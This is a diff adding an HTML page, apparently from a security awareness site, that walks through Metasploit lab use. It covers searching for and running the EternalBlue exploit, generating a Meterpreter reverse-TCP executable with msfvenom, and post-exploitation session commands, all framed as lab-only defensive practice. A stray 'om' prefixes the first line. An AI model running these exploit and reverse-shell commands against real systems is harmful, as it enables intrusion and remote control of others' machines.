@@ -1,0 +1,52 @@
+om<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit Framework Awareness</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <div class="page">
+        <header>
+            <h1>Metasploit Framework Awareness</h1>
+            <p>Recognize exploitation patterns by testing known vulnerabilities in your lab environment.</p>
+        </header>
+
+        <section class="card">
+            <h2>Search for modules</h2>
+            <pre><code>sudo msfconsole
+search eternalblue</code></pre>
+            <p>Launch Metasploit console and find modules matching known vulnerabilities like EternalBlue.</p>
+        </section>
+
+        <section class="card">
+            <h2>Use a module safely</h2>
+            <pre><code>use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.10
+exploit</code></pre>
+            <p>Test against vulnerable lab targets (e.g., Metasploitable VM) to understand exploit mechanics. Never use on production systems.</p>
+        </section>
+
+        <section class="card">
+            <h2>Generate payloads</h2>
+            <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > lab-payload.exe</code></pre>
+            <p>Create payloads for controlled testing of defensive tools like antivirus evasion detection.</p>
+        </section>
+
+        <section class="card">
+            <h2>Monitor sessions</h2>
+            <pre><code>sessions -l
+sessions -i 1
+sysinfo
+shell
+getuid</code></pre>
+            <p>Interact with lab sessions to simulate attacker post-exploitation while monitoring your EDR/IDS.</p>
+        </section>
+
+        <p class="note"><a href="index.html">← Back to Tool Awareness</a></p>
+    </div>
+</body>
+</html>
